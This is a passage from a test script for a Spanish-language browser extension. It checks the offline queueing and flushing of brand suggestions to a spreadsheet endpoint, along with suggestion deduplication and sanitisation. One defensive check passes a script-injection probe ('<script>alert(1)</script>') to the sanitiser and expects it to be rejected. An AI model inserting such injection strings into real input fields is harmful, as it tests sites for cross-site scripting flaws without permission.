  const mockChrome = {
    storage: {
      local: {
        get: async (keys) => {
          const out = {};
          const ks = keys == null ? Object.keys(store) : typeof keys === "string" ? [keys] : Array.isArray(keys) ? keys : Object.keys(keys);
          for (const k of ks) if (k in store) out[k] = clone(store[k]);
          return out;
        },
        set: async (obj) => {
          for (const [k, v] of Object.entries(obj)) store[k] = clone(v);
        }
      }
    },
    runtime: {
      getURL: (p) => "ext://" + p,
      onMessage: { addListener: () => {} },
      onInstalled: { addListener: () => {} },
      onStartup: { addListener: () => {} }
    },
    tabs: { create: async () => {}, onUpdated: { addListener: () => {} } },
    permissions: { contains: async () => true },
    alarms: { create: () => {}, onAlarm: { addListener: () => {} } },
    action: { setBadgeText: async () => {}, setBadgeBackgroundColor: async () => {} }
  };

  const mockFetch = async (url, opts) => {
    if (String(url).startsWith("ext://")) {
      if (String(url) === "ext://data/proyecto.json") {
        return {
          ok: true,
          status: 200,
          json: async () => ({
            repo: "ginaproyecto02-lgtm/project-gina",
            sugerencias_url: "https://script.google.com/macros/s/AKfycbz_test_endpoint_12345/exec"
          }),
          text: async () => JSON.stringify({
            repo: "ginaproyecto02-lgtm/project-gina",
            sugerencias_url: "https://script.google.com/macros/s/AKfycbz_test_endpoint_12345/exec"
          })
        };
      }
      return { ok: false, status: 404 };
    }
    if (!networkOnline) {
      throw new Error("Failed to fetch (offline network)");
    }
    const body = opts && opts.body ? JSON.parse(opts.body) : null;
    postedData.push(body);
    return {
      ok: true,
      status: 200,
      json: async () => ({ ok: true }),
      text: async () => JSON.stringify({ ok: true })
    };
  };

  const ctx = vm.createContext({
    chrome: mockChrome,
    fetch: mockFetch,
    console,
    URL,
    AbortController,
    setTimeout,
    clearTimeout,
    Date,
    JSON,
    Promise,
    Math,
    Object,
    Array,
    String,
    Number,
    Set,
    Map,
    RegExp,
    Error
  });
  ctx.globalThis = ctx;
  ctx.importScripts = (...files) => {
    for (const f of files) {
      vm.runInContext(fs.readFileSync(path.join(EXT, "src", f), "utf8"), ctx, { filename: f });
    }
  };

  // Cargar módulos necesarios previos a background.js
  vm.runInContext(fs.readFileSync(path.join(EXT, "src", "ai.js"), "utf8"), ctx, { filename: "ai.js" });
  vm.runInContext(fs.readFileSync(path.join(EXT, "src", "background.js"), "utf8"), ctx, { filename: "background.js" });

  // 1. Envío sin red: debe encolar en storage.local.suggestionsQueue con estado 'en_cola'
  networkOnline = false;
  const offlinePayload = {
    v: 1,
    tipo: "marca",
    marca: "Café Sin Conexión",
    tienda: "amazon.com.mx",
    producto: "Café Gourmet 500g",
    pais: "MX",
    ext: "3.2.0",
    inst: "eeeeeeee-4444-4444-8444-444444444444"
  };

  const offlineRes = await ctx.sendToSheet(offlinePayload);
  check("Cliente sin conexión: sendToSheet responde con status 'en_cola'",
    offlineRes.ok === true && offlineRes.status === "en_cola");

  check("Cliente sin conexión: la sugerencia se almacena en suggestionsQueue de storage.local",
    Array.isArray(store.suggestionsQueue) && store.suggestionsQueue.length === 1 && store.suggestionsQueue[0].marca === "Café Sin Conexión");

  // 2. Se restablece la red y se llama a flushSuggestionsQueue
  networkOnline = true;
  await ctx.flushSuggestionsQueue();

  check("Red restablecida: flushSuggestionsQueue envía las sugerencias encoladas a Google Sheets",
    postedData.length === 1 && postedData[0].marca === "Café Sin Conexión");

  check("Tras envío exitoso: suggestionsQueue queda completamente vacía",
    Array.isArray(store.suggestionsQueue) && store.suggestionsQueue.length === 0);

  // --- 2.6 Robot Semanal: Manejo de Cuotas, Duplicados y Marcas Populares ---
  console.log("\n--- 2.6 Sugerencias comunes: Filtrado, deduplicación y sanitización ---");
  {
    const comun = require("../job/sugerencias_comun.js");

    const mockBrandsDb = {
      marcas: [{ n: "Bimbo", g: "bimbo" }, { n: "Herdez", g: "herdez" }],
      grupos: { bimbo: { empresa: "Grupo Bimbo" }, herdez: { empresa: "Grupo Herdez" } }
    };

    const mockOpenIssues = [
      { title: "Marca faltante: Marinela", body: "Detalles" }
    ];

    check("Sugerencias comunes: descarta marcas ya catalogadas en brands.json y en issues abiertos",
      comun.isDuplicateBrand("Bimbo", mockBrandsDb, mockOpenIssues) === true &&
      comun.isDuplicateBrand("Marinela", mockBrandsDb, mockOpenIssues) === true &&
      comun.isDuplicateBrand("Jabón Zazil", mockBrandsDb, mockOpenIssues) === false);

    check("Sugerencias comunes: valida y sanea marca nueva limpia",
      comun.plausibleBrand("Jabón Zazil") === true &&
      comun.sanitize({ tipo: "marca", marca: "Jabón Zazil", tienda: "tienda.com", producto: "Jabón 100g" }) !== null);

    check("Sugerencias comunes: marca peligrosa rechazada por plausibleBrand",
      comun.plausibleBrand("<script>alert(1)</script>") === false &&
      comun.plausibleBrand("@everyone") === false);

    check("Sugerencias comunes: formateo estructurado para issue o robot",
      comun.buildIssueBody({ tipo: "marca", marca: "Miel Melipona Maya", tienda: "tienda.com", producto: "Miel 250ml" })
        .includes("<!-- gina:sugerencia v1 tipo=marca -->"));

    check("Sugerencias comunes: deduplicación reconoce marcas con alias o símbolos",
      comun.isDuplicateBrand("Herdez®", mockBrandsDb, []) === true);
  }

  // --- REPORTE FINAL ---
  console.log("\n=======================================================");
  console.log(`=== RESULTADOS DEL CICLO DE PRUEBAS EXTENSO ===`);
  console.log(`Total de pruebas ejecutadas: ${total}`);
  console.log(`Pruebas correctas:           ${pass} (${((pass / total) * 100).toFixed(1)}%)`);
  console.log(`Pruebas fallidas:            ${total - pass}`);
  console.log("=======================================================\n");

  if (failureDetails.length > 0) {
    console.error("Detalle de fallas:");
    failureDetails.forEach((f) => console.error(`- ${f.name}: ${f.detail}`));
    process.exit(1);
  } else {
    console.log("¡Todas las pruebas del ciclo extenso pasaron exitosamente!");
    process.exit(0);
  }
})();
